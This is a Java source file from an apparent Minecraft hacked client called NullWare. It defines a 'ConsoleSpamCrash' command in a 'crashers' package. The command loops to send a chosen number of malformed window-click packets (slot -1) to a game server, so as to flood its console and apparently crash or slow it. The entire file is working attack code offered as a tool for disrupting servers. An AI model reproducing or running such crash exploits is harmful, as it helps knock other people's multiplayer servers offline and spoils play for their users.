package com.Vxrtrauter.NullWare.command.commands.crashers;

import com.Vxrtrauter.NullWare.command.commands.CrashHandler;
import net.minecraft.client.Minecraft;
import net.minecraft.item.ItemStack;
import net.minecraft.network.play.client.C0EPacketClickWindow;

import static com.Vxrtrauter.NullWare.client.MessageHandler.sendMessage;

public class ConsoleSpamCrash implements CrashHandler {
    private final Minecraft mc = Minecraft.getMinecraft();

    @Override
    public void execute(int packets) {
        sendMessage("Spamming the console...");
        for (int i = 0; i < packets; i++) {
            mc.getNetHandler().getNetworkManager().sendPacket(new C0EPacketClickWindow(0, -1, 1, 1, new ItemStack(mc.thePlayer.getHeldItem().getItem()), (short) 0));
        }
    }
}